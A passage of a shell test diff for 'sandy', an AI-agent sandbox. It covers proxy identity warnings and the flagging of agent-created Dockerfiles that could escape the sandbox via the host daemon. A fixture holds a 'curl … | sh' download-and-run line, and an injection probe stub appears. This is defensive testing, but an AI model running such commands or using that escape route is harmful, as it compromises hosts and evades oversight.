+# --- (0)-(6): the REAL helper, extracted, under set -euo pipefail ----------
+_S185_D="$(cd "$(mktemp -d)" && pwd -P)"   # macOS: mktemp -d returns a symlink
+_S185_FN="$(awk '/^_sandy_proxy_identity_check\(\) \{/,/^}$/' "$SANDY_SCRIPT")"
+check "§185(0) extracted _sandy_proxy_identity_check from sandy (mutation: a rename empties it and must fail HERE, not silently pass (1)-(6))" \
+    bash -c 'printf "%s\n" "$1" | grep -q "^_sandy_proxy_identity_check() {" && printf "%s\n" "$1" | grep -q "^}$"' _ "$_S185_FN"
+mkdir -p "$_S185_D/ubin"
+cat > "$_S185_D/ubin/docker" <<'EOF'
+#!/bin/bash
+case "${S185_U:-}" in
+    match)    printf '%s\n' 'sha256:aaa|2026-09' ;;
+    src)      printf '%s\n' 'sha256:0ld|2026-09' ;;
+    epoch)    printf '%s\n' 'sha256:aaa|2026-08' ;;
+    nolabels) printf '\n' ;;
+    novalue)  printf '%s\n' '<no value>|<no value>' ;;
+    absent)   exit 1 ;;
+esac
+exit 0
+EOF
+chmod +x "$_S185_D/ubin/docker"
+# _s185_unit <mode> -> "rc=N stale=<...>" then the warn lines
+_s185_unit() {
+    PATH="$_S185_D/ubin:$PATH" S185_U="$1" SANDY_OFFLINE="${2:-0}" bash -c '
+        set -euo pipefail
+        warn() { printf "WARN %s\n" "$*"; }
+        eval "$1"
+        _SANDY_PROXY_IDENTITY_STALE=""
+        RC=0
+        _sandy_proxy_identity_check sandy-proxy sha256:aaa 2026-09 || RC=$?
+        printf "rc=%s stale=%s\n" "$RC" "$_SANDY_PROXY_IDENTITY_STALE"
+    ' _ "$_S185_FN" 2>&1 || printf 'rc=ABORT\n'
+}
+_S185_U="$(_s185_unit match)"
+check "§185(1) labels MATCH -> silent, rc 0, nothing recorded for the session-end notice (mutation: warn unconditionally -> a WARN line)" \
+    bash -c '[ "$1" = "rc=0 stale=" ]' _ "$_S185_U"
+_S185_U="$(_s185_unit src)"
+check "§185(2) SOURCE differs -> one warning naming old vs expected source, the chokepoint and sandy --rebuild; rc 0 (mutation: drop the src comparison -> silent)" \
+    bash -c 'printf "%s" "$1" | grep -qF "source sha256:0ld (expected sha256:aaa)" && printf "%s" "$1" | grep -qF "egress policy chokepoint" && printf "%s" "$1" | grep -qF "sandy --rebuild" && ! printf "%s" "$1" | grep -qF "epoch 2026" && printf "%s" "$1" | grep -q "^rc=0 stale=source sha256:0ld"' _ "$_S185_U"
+_S185_U="$(_s185_unit epoch)"
+check "§185(3) EPOCH differs -> the warning names old vs expected epoch, and not the (matching) source; rc 0 (mutation: drop the epoch comparison -> silent)" \
+    bash -c 'printf "%s" "$1" | grep -qF "epoch 2026-08 (expected 2026-09)" && ! printf "%s" "$1" | grep -qF "source sha256" && printf "%s" "$1" | grep -q "^rc=0 stale=epoch 2026-08"' _ "$_S185_U"
+_S185_U="$(_s185_unit nolabels)"
+check "§185(4) NO labels (an image built before #299) -> warns that it carries no identity, naming what is expected; rc 0" \
+    bash -c 'printf "%s" "$1" | grep -qF "no identity labels" && printf "%s" "$1" | grep -qF "expected source sha256:aaa, epoch 2026-09" && printf "%s" "$1" | grep -q "^rc=0 stale=it carries no identity labels"' _ "$_S185_U"
+_S185_U="$(_s185_unit novalue)"
+check "§185(5) a '<no value>' template answer is read as MISSING, never compared as a value (mutation: drop the fold -> it reports source <no value>)" \
+    bash -c 'printf "%s" "$1" | grep -qF "no identity labels" && ! printf "%s" "$1" | grep -qF "source <no value>" && printf "%s" "$1" | grep -q "^rc=0 "' _ "$_S185_U"
+_S185_U="$(_s185_unit absent)"
+check "§185(6) an image docker cannot inspect -> silent, rc 0 (the build gate owns the no-image case; mutation: return the inspect status -> rc=1 aborts set -e)" \
+    bash -c '[ "$1" = "rc=0 stale=" ]' _ "$_S185_U"
+_S185_U="$(_s185_unit src 1)"
+check "§185(6b) under SANDY_OFFLINE=1 the fix names the offline setting too (#219)" \
+    bash -c 'printf "%s" "$1" | grep -qF "without SANDY_OFFLINE=1 / --no-update-check"' _ "$_S185_U"
+
+# --- (7)-(13): the REAL launch path (--build-only), behind stub docker/curl --
+# The proxy phase runs before --build-only exits and before start_proxy_sidecar
+# would run the image, so --build-only exercises exactly the launch-site check.
+# SANDY_DAEMON_LOG is set so a refusal would drop its .fatal marker (the
+# supervisor fast-fail signal) -- the "not refused" property is asserted on
+# that marker as well as on the exit code.
+mkdir -p "$_S185_D/bin" "$_S185_D/home/ws" "$_S185_D/sh"
+cat > "$_S185_D/bin/curl" <<'EOF'
+#!/bin/bash
+[ "${S185_NET:-ok}" = ok ] || exit 7
+exit 0
+EOF
+cat > "$_S185_D/bin/docker" <<'EOF'
+#!/bin/bash
+printf 'docker %s\n' "$*" >> "$S185_DOCKER_LOG"
+[ "$1" = build ] && exit 0
+case "$*" in
+    *'-f {{with .Config.Labels}}{{index . "sandy.proxy_src"}}'*)
+        case "${S185_PX:-}" in
+            match)    printf '%s|%s\n' "$S185_SRC" "$S185_EPOCH" ;;
+            src)      printf '%s|%s\n' 'sha256:0ld' "$S185_EPOCH" ;;
+            epoch)    printf '%s|%s\n' "$S185_SRC" '2000-01' ;;
+            nolabels) printf '\n' ;;
+            *) exit 1 ;;
+        esac
+        exit 0
+        ;;
+esac
+case "$1" in
+    image) case "$*" in *'{{.Id}}'*) echo sha256:0000 ;; esac ;;
+esac
+exit 0
+EOF
+chmod +x "$_S185_D/bin/curl" "$_S185_D/bin/docker"
+export S185_DOCKER_LOG="$_S185_D/docker.log"
+_S185_OUT=""; _S185_RC=0
+# $@ = extra env assignments (NAME=VALUE) for this run
+_s185_run() {
+    : > "$S185_DOCKER_LOG"
+    rm -f "$_S185_D/daemon.log.fatal"
+    _S185_RC=0
+    # SANDY_PROXY_REF/GITHUB_HEAD_REF cleared: the fixture reads the LOCAL-checkout
+    # `# proxy-src:` identity, and PR CI's ambient GITHUB_HEAD_REF forces the
+    # clone path. Set before "$@" so a case can still pin one.
+    _S185_OUT="$(cd "$_S185_D/home/ws" && env -u SANDY_OFFLINE SANDY_PROXY_REF= GITHUB_HEAD_REF= "$@" HOME="$_S185_D/home" \
+        SANDY_HOME="$_S185_D/sh" SANDY_DAEMON_LOG="$_S185_D/daemon.log" PATH="$_S185_D/bin:$PATH" \
+        bash "$SANDY_SCRIPT" --build-only </dev/null 2>&1)" || _S185_RC=$?
+}
+_s185_run S185_PX=absent
+check "§185(7) priming --build-only (proxy on, every image built) succeeds (rc=$_S185_RC)" \
+    bash -c 'test "$1" -eq 0 && grep -q -- "-t sandy-proxy " "$2"' _ "$_S185_RC" "$S185_DOCKER_LOG"
+check "§185(7b) a proxy image this launch just BUILT is not re-inspected -- it carries these labels by construction (mutation: check unconditionally -> a label inspect after the build)" \
+    bash -c '! grep -qF "{{with .Config.Labels}}{{index . \"sandy.proxy_src\"}}" "$1"' _ "$S185_DOCKER_LOG"
+# The identity this sandy computes, read from the Dockerfile the build used
+# (the same values generate_dockerfile_proxy handed to the build as labels).
+S185_SRC="sha256:$(sed -n 's/^# proxy-src: \([0-9a-f]*\) .*/\1/p' "$_S185_D/sh/Dockerfile.proxy")"
+S185_EPOCH="$(sed -n 's/^# freshness-epoch: \([^ ]*\) .*/\1/p' "$_S185_D/sh/Dockerfile.proxy")"
+export S185_SRC S185_EPOCH
+check "§185(7c) fixture: read both identities from the generated Dockerfile.proxy" \
+    bash -c '[ "${#1}" -eq 71 ] && printf "%s" "$2" | grep -Eq "^[0-9]{4}-[0-9]{2}$"' _ "$S185_SRC" "$S185_EPOCH"
+_S185_WARN="is NOT the one this sandy would build"
+
+_s185_run S185_PX=match
+check "§185(8) launch path, labels MATCH -> the image is inspected and nothing is said (rc=$_S185_RC)" \
+    bash -c 'test "$1" -eq 0 && ! printf "%s" "$2" | grep -qF "$3" && grep -qF "sandy.proxy_src" "$4"' _ "$_S185_RC" "$_S185_OUT" "$_S185_WARN" "$S185_DOCKER_LOG"
+_s185_run S185_PX=src
+check "§185(9) launch path, SOURCE mismatch -> warns with old vs the source this sandy computed, and is NOT refused: rc 0, no .fatal (rc=$_S185_RC; mutation: remove the call site -> no warning)" \
+    bash -c 'test "$1" -eq 0 && [ ! -e "$5" ] && printf "%s" "$2" | grep -qF "$3" && printf "%s" "$2" | grep -qF "source sha256:0ld (expected $4)"' _ "$_S185_RC" "$_S185_OUT" "$_S185_WARN" "$S185_SRC" "$_S185_D/daemon.log.fatal"
+_s185_run S185_PX=nolabels
+check "§185(10) launch path, labels MISSING -> warns, rc 0, no .fatal (rc=$_S185_RC; mutation: exit 1 on mismatch -> rc 1)" \
+    bash -c 'test "$1" -eq 0 && [ ! -e "$4" ] && printf "%s" "$2" | grep -qF "$3" && printf "%s" "$2" | grep -qF "no identity labels"' _ "$_S185_RC" "$_S185_OUT" "$_S185_WARN" "$_S185_D/daemon.log.fatal"
+
+# The realistic path: the epoch moved (hash file stale), and the #218 gate
+# DEFERS the proxy rebuild because build resources are unreachable. The old
+# image is kept -- and must be named as not what this sandy would build.
+rm -f "$_S185_D/sh/.build_hash_proxy"
+_s185_run S185_PX=epoch S185_NET=no
+check "§185(11) a #218-DEFERRED proxy rebuild runs on the old image WITH the warning naming the epoch; rc 0, no .fatal (rc=$_S185_RC)" \
+    bash -c 'test "$1" -eq 0 && [ ! -e "$5" ] && printf "%s" "$2" | grep -qF "skipping the egress proxy image rebuild" && printf "%s" "$2" | grep -qF "$3" && printf "%s" "$2" | grep -qF "epoch 2000-01 (expected $4)" && ! grep -q -- "^docker build .*-t sandy-proxy " "$6"' _ "$_S185_RC" "$_S185_OUT" "$_S185_WARN" "$S185_EPOCH" "$_S185_D/daemon.log.fatal" "$S185_DOCKER_LOG"
+_s185_run S185_PX=epoch S185_NET=no SANDY_OFFLINE=1
+check "§185(12) ...and under SANDY_OFFLINE=1 the same warning names the offline setting in its fix (rc=$_S185_RC)" \
+    bash -c 'test "$1" -eq 0 && printf "%s" "$2" | grep -qF "$3" && printf "%s" "$2" | grep -qF "without SANDY_OFFLINE=1"' _ "$_S185_RC" "$_S185_OUT" "$_S185_WARN"
+
+# --- (13): no docker spawn added to the introspection fast paths ----------
+# --print-state full mode reads the same labels, but inside its single
+# `{{.Created}}|...` inspect; the launch-time check's own format must never
+# appear there, nor anywhere in the light mode or --print-schema.
+_S185_FP=0
+for _s185_args in "--print-state" "--print-state light" "--print-schema" "--print-version"; do
+    : > "$S185_DOCKER_LOG"
+    # shellcheck disable=SC2086
+    (cd "$_S185_D/home/ws" && HOME="$_S185_D/home" SANDY_HOME="$_S185_D/sh" PATH="$_S185_D/bin:$PATH" S185_PX=src \
+        bash "$SANDY_SCRIPT" $_s185_args >/dev/null 2>&1) || true
+    grep -qF -- '-f {{with .Config.Labels}}{{index . "sandy.proxy_src"}}' "$S185_DOCKER_LOG" && _S185_FP=$((_S185_FP + 1))
+done
+check "§185(13) the introspection fast paths (--print-state full/light, --print-schema, --print-version) never run the launch-time identity inspect ($_S185_FP did)" \
+    test "$_S185_FP" -eq 0
+
+# --- (14): the session-end #218 notice repeats it -------------------------
+# Extracted from the REAL cleanup body: from the #218 comment to the #219 one.
+_S185_END="$(sed -n '/^    # #218: if a build was skipped or fell back this launch/,/^    # #219: the same erosion/p' "$SANDY_SCRIPT")"
+check "§185(14pre) extracted the session-end deferred-refresh notice (mutation: a reworded anchor empties it)" \
+    bash -c 'printf "%s" "$1" | grep -qF "_SANDY_PROXY_IDENTITY_STALE"' _ "$_S185_END"
+_s185_end() {
+    bash -c 'YELLOW=""; NC=""; _SANDY_BUILD_DEFERRED="$2"; _SANDY_PROXY_IDENTITY_STALE="$3"; eval "$1"' _ "$_S185_END" "$1" "$2" 2>&1
+}
+_S185_E="$(_s185_end false "epoch 2026-08 (expected 2026-09)")"
+check "§185(14a) session end: a stale proxy is repeated, with what differed and sandy --rebuild -- even when no build was deferred (a pre-label image; mutation: fold it under the deferred branch -> nothing)" \
+    bash -c 'printf "%s" "$1" | grep -qF "epoch 2026-08 (expected 2026-09)" && printf "%s" "$1" | grep -qF "chokepoint" && printf "%s" "$1" | grep -qF "sandy --rebuild"' _ "$_S185_E"
+_S185_E="$(_s185_end true "")"
+check "§185(14b) session end: a deferral with a MATCHING proxy says nothing about the proxy (mutation: print the proxy line unconditionally)" \
+    bash -c 'printf "%s" "$1" | grep -qF "An image refresh was deferred" && ! printf "%s" "$1" | grep -qF "egress proxy"' _ "$_S185_E"
+
+rm -rf "$_S185_D"
+unset _S185_D _S185_FN _S185_U _S185_OUT _S185_RC _S185_WARN _S185_FP _s185_args _S185_END _S185_E
+unset S185_DOCKER_LOG S185_SRC S185_EPOCH
+unset -f _s185_unit _s185_run _s185_end 2>/dev/null || true
+
+echo "§182: a .sandy/ a SESSION created is flagged at the next Dockerfile approval (#295 item 3)"
+# WHY. .sandy/ is protected against modification, not creation: it is mounted
+# :ro only when it existed at launch, so a session that started without one can
+# write .sandy/Dockerfile through the rw workspace bind -- and sandy is the one
+# that then offers to run its RUN lines on the host daemon, at the NEXT launch.
+# Maintainer decision (option C): keep the existence gate, but RECORD the
+# creation at session end, in a place neither the workspace nor the container
+# can reach, and have the next approval prompt say so ahead of every other
+# provenance line.
+#
+# Everything here runs the REAL code: the launch snapshot and the session-end
+# block are sliced out of sandy verbatim and run under set -euo pipefail (as
+# sandy itself is), and the gate is the real _sandy_project_dockerfile_approved.
+_S182_SANDY="$(cd "$(dirname "$0")/.." && pwd -P)/sandy"
+_S182_D="$(cd "$(mktemp -d)" && pwd -P)"
+python3 - "$_S182_SANDY" "$_S182_D" <<'S182_EXTRACT'
+import sys
+src = open(sys.argv[1]).read()
+out = sys.argv[2]
+lines = src.split('\n')
+def fn(name):
+    for i, l in enumerate(lines):
+        if l.startswith(name + '()'):
+            if l.rstrip().endswith('}'):
+                return l + '\n'
+            j = i
+            while lines[j] != '}':
+                j += 1
+            return '\n'.join(lines[i:j + 1]) + '\n'
+    raise SystemExit('missing function ' + name)
+names = ['sha256', 'info', '_sandy_protected_dirs', '_sandy_protected_files',
+         '_sandy_configured_hooks_rel', '_sandy_extra_hooks_dir', '_sandy_dir_is_inert_git',
+         '_sandy_context_hash', '_sandy_df_session_record', '_sandy_slug_for',
+         '_sandy_note_session_created_sandy_dir', '_sandy_project_dockerfile_approved']
+open(out + '/fns.sh', 'w').write(''.join(fn(n) for n in names))
+a = src.index(': > "$SANDBOX_DIR/.session-created-stubs"\n')
+b = src.index('done < <(_sandy_protected_files)\n', a) + len('done < <(_sandy_protected_files)\n')
+open(out + '/snap.sh', 'w').write(src[a:b])
+a = src.index('    # Detect protected-path appearances')
+b = src.index('    # #80: .git/HEAD is rw in-container', a)
+open(out + '/end.sh', 'w').write(src[a:b])
+S182_EXTRACT
+cat > "$_S182_D/drive.sh" <<'S182_DRIVE'
+set -euo pipefail
+S182_D="$1"; WORK_DIR="$2"; SANDBOX_DIR="$3"; SANDY_HOME="$4"; mode="$5"
+GREEN=""; YELLOW=""; NC=""
+. "$S182_D/fns.sh"
+if [ "$mode" = launch ]; then
+    RUN_FLAGS=(); SANDY_WORKSPACE=/ws
+    . "$S182_D/snap.sh"
+elif [ "$mode" = end ]; then
+    . "$S182_D/end.sh"
+else
+    SANDY_AUTO_APPROVE_PRIVILEGED=0
+    rc=0; _sandy_project_dockerfile_approved "$WORK_DIR/.sandy/Dockerfile" || rc=$?
+    echo "RC=$rc"
+fi
+S182_DRIVE
+cat > "$_S182_D/ptyans.py" <<'PY'
+import os, pty, sys, select, time, signal
+answer = sys.argv[1].encode()
+pid, fd = pty.fork()
+if pid == 0:
+    try:
+        os.execvp(sys.argv[2], sys.argv[2:])
+    finally:
+        os._exit(127)
+buf = b''
+sent = False
+deadline = time.time() + 60
+while time.time() < deadline:
+    r, _, _ = select.select([fd], [], [], 0.5)
+    if fd in r:
+        try:
+            d = os.read(fd, 4096)
+        except OSError:
+            break
+        if not d:
+            break
+        buf += d
+        if not sent and b'[y/N]' in buf:
+            os.write(fd, answer + b'\n')
+            sent = True
+else:
+    os.kill(pid, signal.SIGKILL)
+os.waitpid(pid, 0)
+sys.stdout.write(buf.decode('utf-8', 'replace'))
+PY
+_s182_mk() {   # $1 = fixture; a workspace with NO .sandy/, its sandbox dir and SANDY_HOME
+    mkdir -p "$_S182_D/$1/ws" "$_S182_D/$1/sb" "$_S182_D/$1/home"
+}
+_s182_run() {   # $1 = fixture  $2 = launch|end|gate  -> combined output
+    local T="$_S182_D/$1"
+    bash "$_S182_D/drive.sh" "$_S182_D" "$T/ws" "$T/sb" "$T/home" "$2" </dev/null 2>&1 || echo "DRIVE-FAILED"
+}
+_s182_pty() {   # $1 = fixture  $2 = answer; the gate on a pty -> its output
+    local T="$_S182_D/$1"
+    ( cd "$T/ws" && python3 "$_S182_D/ptyans.py" "$2" bash "$_S182_D/drive.sh" "$_S182_D" "$T/ws" "$T/sb" "$T/home" gate 2>&1 ) || true
+}
+_s182_rec() {   # $1 = fixture -> where the gate looks for the record
+    local T="$_S182_D/$1" wh
+    wh="$(printf '%s' "$T/ws" | { shasum -a 256 2>/dev/null || sha256sum; } | awk '{print $1}' | cut -c1-16)"
+    printf '%s' "$T/home/approvals/dockerfile-$wh.session-created"
+}
+_s182_approval() {   # $1 = fixture -> the approval file the record qualifies
+    local r
+    r="$(_s182_rec "$1")"
+    printf '%s' "${r%.session-created}.list"
+}
+_s182_hash() { bash -c ". '$_S182_D/fns.sh'"$'\n''_sandy_context_hash "$1"' _ "$1"; }
+_s182_df() { mkdir -p "$1/.sandy"; printf 'ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN curl -s https://example.invalid/x | sh\n' > "$1/.sandy/Dockerfile"; }
+_s182_created() {   # $1 = fixture: launch without .sandy/, the session creates it, the session ends
+    _s182_mk "$1"
+    _S182_OUT="$(_s182_run "$1" launch)"
+    _s182_df "$_S182_D/$1/ws"
+    _S182_OUT="$(_s182_run "$1" end)"
+}
+
+check "§182(pre) sliced the launch snapshot, the session-end block and the gate out of sandy (mutation: a rename empties a slice and must fail HERE)" \
+    bash -c 'grep -q "protected-existed-at-launch" "$1/snap.sh" && grep -q "_sandy_note_session_created_sandy_dir" "$1/end.sh" && grep -q "^_sandy_project_dockerfile_approved()" "$1/fns.sh"' _ "$_S182_D"
+
+# --- A: the session that CREATES .sandy/ -------------------------------------
+_s182_created A
+_S182_HA="$(_s182_hash "$_S182_D/A/ws/.sandy")"
+check "§182(1) a .sandy/ absent at launch and present at session end is RECORDED, with the context hash as the session left it (mutation: dropping the cleanup call leaves no record)" \
+    bash -c 'test "$(head -n1 "$1" 2>/dev/null)" = "$2" && grep -q "^# by: *session-end$" "$1"' _ "$(_s182_rec A)" "$_S182_HA"
+check "§182(2) ...and the session-end warning says the next build will be flagged" \
+    bash -c 'printf "%s" "$1" | grep -q "Protected paths appeared" && printf "%s" "$1" | grep -q "flag it in the approval prompt as CREATED BY A SANDY SESSION" && ! printf "%s" "$1" | grep -q DRIVE-FAILED' _ "$_S182_OUT"
+check "§182(3) the record is OUTSIDE the workspace and OUTSIDE the sandbox dir -- the only trees a repository or the container can write -- and under SANDY_HOME/approvals (mutation: keeping it in SANDBOX_DIR makes it agent-forgeable)" \
+    bash -c 'r="$1"; [ "${r#"$2"/}" = "$r" ] && [ "${r#"$3"/}" = "$r" ] && [ "$(dirname "$r")" = "$4/approvals" ] && [ -f "$r" ]' \
+    _ "$(_s182_rec A)" "$_S182_D/A/ws" "$_S182_D/A/sb" "$_S182_D/A/home"
+
+# --- B: the prompt at the next launch ----------------------------------------
+_S182_OUT="$(_s182_run A gate)"
+_S182_DATE="$(sed -n 's/^# recorded: *//p' "$(_s182_rec A)")"
+check "§182(4) the next prompt says CREATED BY A SANDY SESSION with the recorded date, instead of \"NO prior approval\" (mutation: dropping the branch falls back to the weaker line)" \
+    bash -c '[ -n "$2" ] && printf "%s" "$1" | grep -qF "CREATED BY A SANDY SESSION (recorded $2)" && printf "%s" "$1" | grep -q "byte-for-byte" && ! printf "%s" "$1" | grep -q "NO prior approval"' _ "$_S182_OUT" "$_S182_DATE"
+check "§182(5) ...an unanswerable (no-tty) prompt still fails closed, and does NOT clear the record" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=1" && [ -f "$2" ]' _ "$_S182_OUT" "$(_s182_rec A)"
+printf 'RUN true\n' >> "$_S182_D/A/ws/.sandy/Dockerfile"
+_S182_OUT="$(_s182_run A gate)"
+check "§182(6) content edited after the session ended is still flagged, and says it CHANGED since (mutation: matching on the hash alone would drop the flag for an agent file with one line touched)" \
+    bash -c 'printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && printf "%s" "$1" | grep -q "CHANGED since that session ended"' _ "$_S182_OUT"
+
+# --- C: a .sandy/ that EXISTED at launch is not a session's creation ----------
+_s182_mk B
+_s182_df "$_S182_D/B/ws"
+_S182_OUT="$(_s182_run B launch)"
+printf 'RUN echo edited\n' >> "$_S182_D/B/ws/.sandy/Dockerfile"
+_S182_OUT="$(_s182_run B end)"
+check "§182(7) a .sandy/ that existed at launch writes NO record (mutation: dropping the existed-at-launch test flags every operator-written Dockerfile)" \
+    bash -c '[ ! -e "$1" ] && ! printf "%s" "$2" | grep -q DRIVE-FAILED' _ "$(_s182_rec B)" "$_S182_OUT"
+_S182_OUT="$(_s182_run B gate)"
+check "§182(8) ...and its prompt keeps the ordinary provenance line" \
+    bash -c 'printf "%s" "$1" | grep -q "NO prior approval" && ! printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION"' _ "$_S182_OUT"
+_s182_mk C
+_S182_OUT="$(_s182_run C launch)"
+_S182_OUT="$(_s182_run C end)"
+check "§182(9) a session that never creates .sandy/ writes no record" \
+    test ! -e "$(_s182_rec C)"
+
+# --- D: when the record is cleared -- never silently --------------------------
+if command -v python3 >/dev/null 2>&1; then
+    _s182_created E
+    _S182_OUT="$(_s182_pty E y)"
+    check "§182(10) approving (y, on a tty) clears the record AND says so, and the approval keeps the provenance it was given over (mutation: not removing it re-flags reviewed content forever)" \
+        bash -c 'printf "%s" "$1" | grep -q "RC=0" && [ ! -e "$2" ] && printf "%s" "$1" | grep -q "flag is cleared" && grep -q "^# provenance: created by a sandy session" "$3"' _ "$_S182_OUT" "$(_s182_rec E)" "$(_s182_approval E)"
+    _s182_created F
+    _S182_OUT="$(_s182_pty F n)"
+    check "§182(11) declining (N) keeps the record, so the next prompt says the same thing" \
+        bash -c 'printf "%s" "$1" | grep -q "RC=1" && printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && [ -f "$2" ]' _ "$_S182_OUT" "$(_s182_rec F)"
+    # The --start pre-pass calls the same gate; drive the REAL pre-pass once,
+    # against a SANDY_HOME holding only the record the session-end block wrote.
+    mkdir -p "$_S182_D/F/bin" "$_S182_D/F/home2/approvals"
+    printf '#!/usr/bin/env bash\nexit 0\n' > "$_S182_D/F/bin/docker"; chmod +x "$_S182_D/F/bin/docker"
+    cp "$(_s182_rec F)" "$_S182_D/F/home2/approvals/"
+    _S182_OUT="$( (cd "$_S182_D/F/ws" && env -u SANDY_AUTO_APPROVE_PRIVILEGED PATH="$_S182_D/F/bin:$PATH" SANDY_HOME="$_S182_D/F/home2" HOME="$_S182_D/F" SANDY_APPROVE_ONLY=1 SANDY_APPROVE_ONLY_RESULT="$_S182_D/F/result" python3 "$_S182_D/ptyans.py" n bash "$_S182_SANDY" 2>&1) || true )"
+    check "§182(12) the REAL --start pre-pass shows the same CREATED BY A SANDY SESSION line on the client tty" \
+        bash -c 'printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && printf "%s" "$1" | grep -q "Build this .sandy/Dockerfile"' _ "$_S182_OUT"
+else
+    skip "§182(10-12) python3 not available to drive a pty"
+fi
+_s182_created G
+printf '%s\n# workspace: %s\n# approved:  2026-01-02T03:04:05Z\n' "$(_s182_hash "$_S182_D/G/ws/.sandy")" "$_S182_D/G/ws" > "$(_s182_approval G)"
+_S182_OUT="$(_s182_run G gate)"
+check "§182(13) content that matches an existing approval builds, and the stale record is cleared WITH a message (mutation: a silent rm, or none)" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=0" && printf "%s" "$1" | grep -q "flag cleared" && [ ! -e "$2" ]' _ "$_S182_OUT" "$(_s182_rec G)"
+
+# --- E: a session whose cleanup never ran (SIGKILL, reboot, dead supervisor) --
+_s182_mk H
+_S182_OUT="$(_s182_run H launch)"
+_s182_df "$_S182_D/H/ws"
+# No "end" run: the snapshot is left behind, as a killed session leaves it.
+_S182_OUT="$(_s182_run H gate)"
+check "§182(14) the next launch's gate reads a snapshot left by a session that never cleaned up, and flags it (by: next-launch)" \
+    bash -c 'printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && grep -q "^# by: *next-launch$" "$2"' _ "$_S182_OUT" "$(_s182_rec H)"
+
+# --- F: --remove-sandbox reaps the record with the approval it qualifies ------
+_S182_SLUG="$(bash -c ". '$_S182_D/fns.sh'"$'\n''_sandy_slug_for "$1"' _ "$_S182_D/A/ws")"
+mkdir -p "$_S182_D/A/home/sandboxes/$_S182_SLUG" "$_S182_D/A/bin"
+printf '#!/usr/bin/env bash\nexit 0\n' > "$_S182_D/A/bin/docker"; chmod +x "$_S182_D/A/bin/docker"
+printf '{"workspace_path":"%s"}\n' "$_S182_D/A/ws" > "$_S182_D/A/home/sandboxes/$_S182_SLUG/WORKSPACE.json"
+( cd "$_S182_D/A/ws" && PATH="$_S182_D/A/bin:$PATH" SANDY_HOME="$_S182_D/A/home" HOME="$_S182_D/A" bash "$_S182_SANDY" --remove-sandbox --workspace "$_S182_D/A/ws" --yes </dev/null >/dev/null 2>&1 ) || true
+check "§182(15) --remove-sandbox removes the session-created record along with the sandbox" \
+    bash -c '[ ! -d "$1" ] && [ ! -e "$2" ]' _ "$_S182_D/A/home/sandboxes/$_S182_SLUG" "$(_s182_rec A)"
+
+rm -rf "$_S182_D"
+unset _S182_SANDY _S182_D _S182_OUT _S182_HA _S182_DATE _S182_SLUG
+unset -f _s182_mk _s182_run _s182_pty _s182_rec _s182_approval _s182_hash _s182_df _s182_created
+
+echo "§184: SANDY_EFFORT reaches grok (--reasoning-effort, max clamps to xhigh) and gemini (a read-only system settings file); claude's --effort is quoted (#116)"
+# ============================================================
+# Before 2.7.0 SANDY_EFFORT was cleared for a grok-only launch, so grok ran at
+# its default and the marker said null. grok's flag, its alias and its TUI+
+# headless scope are verified first-hand from `grok --help`; its value set is
+# not (the help does not list it), and third-party probes report `max` as a
+# HARD ERROR -- passing it would kill the pane at launch, the #109 grok lesson.
+# So the property that matters most here is that `max` NEVER reaches grok.
+# Driven for real, like §167: the builder is extracted, the command it builds is
+# RUN through `bash -c` the way the pane runs it, against a stub that prints its
+# argv -- so every assertion is on the argv the agent would receive.
+_S184_DIR="$(cd "$(mktemp -d)" && pwd -P)"
+mkdir -p "$_S184_DIR/bin"
+for _s184_a in grok claude; do
+    printf '%s\n' '#!/usr/bin/env bash' 'printf "ARGV:"; printf " [%s]" "$@"; printf "\n"' > "$_S184_DIR/bin/$_s184_a"
+done
+printf '%s\n' '#!/usr/bin/env bash' 'echo S184_PWNED' > "$_S184_DIR/bin/S184_PWNED_CMD"
+chmod +x "$_S184_DIR/bin/grok" "$_S184_DIR/bin/claude" "$_S184_DIR/bin/S184_PWNED_CMD"
+sed -n '/^build_grok_cmd() {/,/^}$/p' "$SANDY_SCRIPT" > "$_S184_DIR/grok.sh"
+sed -n '/^build_claude_cmd() {/,/^}$/p' "$SANDY_SCRIPT" > "$_S184_DIR/claude.sh"
+check "§184(0) build_grok_cmd and build_claude_cmd were extracted and parse (mutation: a rename empties them and every check below goes vacuous)" \
+    bash -c 'grep -q "no-auto-update" "$1" && bash -n "$1" && grep -q "permission-mode" "$2" && bash -n "$2"' _ "$_S184_DIR/grok.sh" "$_S184_DIR/claude.sh"
+_s184_run() { # _s184_run <builder-file> <builder> <effort> [args...] -> argv line of the stub
+    local _f="$1" _b="$2" _e="$3"; shift 3
+    (
+        trap - ERR; set +e; set +u
+        _sandy_translate_args() { :; }
+        _sandy_wrap_cmd_exit_pause() { printf '%s' "$2"; }
+        GROK_MODEL=""; SANDY_MODEL=claude-opus-5; SANDY_TEAMMATE_MODE=""; SANDY_CHANNELS=""
+        SANDY_NEW_SESSION=true; SANDY_EFFORT="$_e"
+        . "$_f"
+        _c="$("$_b" "$@" 2>/dev/null)"
+        PATH="$_S184_DIR/bin:$PATH" bash -c "$_c 2>&1"
+    ) 2>/dev/null
+    return 0
+}
+# Each sandy level reaches grok as the mapped value, in the canonical spelling,
+# exactly once -- and max arrives as xhigh.
+for _s184_l in low:low medium:medium high:high xhigh:xhigh max:xhigh; do
+    _S184_OUT="$(trap - ERR; _s184_run "$_S184_DIR/grok.sh" build_grok_cmd "${_s184_l%%:*}")"
+    check "§184(1:${_s184_l%%:*}) SANDY_EFFORT=${_s184_l%%:*} reaches grok as --reasoning-effort ${_s184_l#*:} (got: $_S184_OUT)" \
+        bash -c '[ "$1" = "ARGV: [--no-auto-update] [--reasoning-effort] [$2]" ]' _ "$_S184_OUT" "${_s184_l#*:}"
+done
+_S184_MAX="$(trap - ERR; _s184_run "$_S184_DIR/grok.sh" build_grok_cmd max)"
+check "§184(2) max NEVER reaches grok -- no argv token is max (grok rejects it outright; mutation: a pass-through arm for max)" \
+    bash -c 'printf "%s\n" "$1" | grep -q "^ARGV:" && ! printf "%s\n" "$1" | grep -qF "[max]"' _ "$_S184_MAX"
+_S184_NONE="$(trap - ERR; _s184_run "$_S184_DIR/grok.sh" build_grok_cmd "")"
+check "§184(3) no SANDY_EFFORT -> no flag: grok keeps its own default (got: $_S184_NONE)" \
